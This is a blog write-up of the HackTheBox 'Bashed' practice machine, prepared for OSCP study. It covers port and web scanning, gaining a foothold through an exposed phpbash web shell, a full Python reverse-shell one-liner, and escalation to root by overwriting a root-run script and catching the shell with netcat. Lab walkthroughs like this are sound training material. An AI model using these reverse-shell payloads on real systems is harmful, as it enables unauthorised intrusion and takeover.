---
layout: post
title: HackTheBox Bashed Writeup - OSCP Practice List 
categories: [security, hackthebox, oscp-writeups, thursday-snack]
tags: [security, hackthebox, oscp]
description: A comprehensive writeup on HackTheBox Bashed VM which helps learn and practice for OSCP.
comments: true
---


### Quick Overview

[Bashed](https://app.hackthebox.com/machines/118) Box is one of the Linux Box from [TJNull OSCP Practice list](https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#). It's one of those quite easy machine where you get initial foothold in one hop and privilege escalation in second hop.

![Bashed VM - HacktheBox Logo](/assets/media/htb-bashed-logo.jpg)

### Enumeration

#### NMapAutomator

Started with enumerating the target with [`NMapAutomator`](https://github.com/21y4d/nmapAutomator) script since it helps in automating all possible ports with vulnerability scripts from `nmap`. Additionally, `NmapAutomator` can help in recon process using `ffuf`, `nikto`, `DNSRecon`, `SMB` enumeration.

> `sudo nmapAutomator.sh -H $IP --type All`

```bash
NMap Scan Results
Running all scans on 10.129.210.13
Host is likely running Linux        
---------------------Starting Port Scan-----------------------                                                                
PORT   STATE SERVICE
80/tcp open  http
----------------------Starting UDP Scan------------------------                                                                                  
No UDP ports are open
```

#### Nikto Scan 

```
Nikto Scan
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.129.210.13
+ Target Hostname:    10.129.210.13
+ Target Port:        80
+ Start Time:         2023-02-12 20:19:51 (GMT-5)
---------------------------------------------------------------------------

+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Server may leak inodes via ETags, header found with file /, inode: 1e3f, size: 55f8bbac32f80, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3268: /dev/: Directory indexing found.
+ OSVDB-3092: /dev/: This might be interesting...
+ OSVDB-3268: /php/: Directory indexing found.
+ OSVDB-3092: /php/: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7916 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2023-02-12 20:23:23 (GMT-5) (212 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### Suspect 1

NMap Scan reports returned very few information, but Nikto scanner has pretty good results with different sub-directories. After going through `/dev/` directory, You might come across `phpbash` php script. Taking a pause, [phpbash](https://github.com/Arrexel/phpbash) is one of the open-source software that implements interactive php shell. Now, It's time to pivot from `Enumeration` to aquire `Local Shell`.

![HacktheBox - Bashed VM - Enumeration](/assets/media/htb-bashed-enumeration-2.png)

![Hackthebox - Bashed VM - Local Shell](/assets/media/htb-bashed-local-shell.png)

### Local Shell

You may use [`revshell`](https://www.revshells.com/) for generating your reverse shell payload. Unlucky me, except python none of the reverse shell language payload was working.

```python
export RHOST="10.129.210.13";export RPORT=8085;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

![Hackthebox - Bashed VM - Local Shell](/assets/media/htb-bashed-local-shell-2.png)

### Privilege Escalation

Now that we've landed as local user `www-data` in the Bashed machine, now let's try lateral movement via privilege escalation. The first few things I used to execute on shell after landing are `whoami` and `sudo -l` verify basic information.

Upon executing `sudo -l`, looks like user `scriptmanager` can execute ALL commands without a password. It's pretty easy to switch user to scriptmanager,

`> sudo -u scriptmanager /bin/bash` 

#### LinEnum.sh

Now it's time for running LinEnum.sh script to identify weakness in the system that can be leveraged to escalate privileges. Upon executing, we come to know that `/scriptmanager` has couple of files named `test.py` and `test.txt`. The former is owned by `scriptmanager` and later by `root`.

```shell
scriptmanager@bashed:/scripts$ ls -l
ls -l
total 8
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Feb 20 16:27 test.txt
scriptmanager@bashed:/scripts$ 
scriptmanager@bashed:/scripts$ cat test.py
cat test.py

f = open("test.txt", "w")
f.write("testing 123!")
f.close
scriptmanager@bashed:/scripts$ 
```

As you can see `test.py` is writing back to `test.txt` which is owned by `root`. Unless `test.py` is executed by `root` user, `test.txt` doesn't have the similar privilege based on my assumption. Now that `test.py` is owned by `scriptmanager`, you can potentially overwrite the content and make `root` to execute on its own context and try escalating privilege.

#### Plan for privilege escalation

1. Overwrite `test.py` with reverse shell payload.
2. Allow `root` to execute `test.py` - It does automatically, No Actions required.
3. Listen for reverse shell and capture root shell

![Privilege Escalation - Bashed VM - HackTheBox](/assets/media/htb-bashed-privilege-escalation-steps.png)

```shell
┌──(kali㉿kali)-[~/htb/bashed-1]
└─$ nc -lnvp 4242              
listening on [any] 4242 ...
connect to [10.10.14.83] from (UNKNOWN) [10.129.215.77] 33960
# dir
test.py  test.txt
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
{SOME_MAGIC_TEXT}
```

### Capture The Flag

So, there are couple of flags to be submitted as outcome from this HackTheBox VM `bashed`.

1. `/home/arrexel/user.txt`
2. `/root/root.txt`

Now, We've officially pwned the system and escalated our privileges as `root` 🎉.

![HackTheBox - Shivasurya.me](/assets/media/htb-sherlock.webp)

### Closing Note:

I hope this post is helpful for folks preparing for Offensive Security Certified Professional certification exam. For bugs,hugs & discussion, DM in [Twitter](https://twitter.com/sshivasurya). Opinions are my own and not the views of my employer.
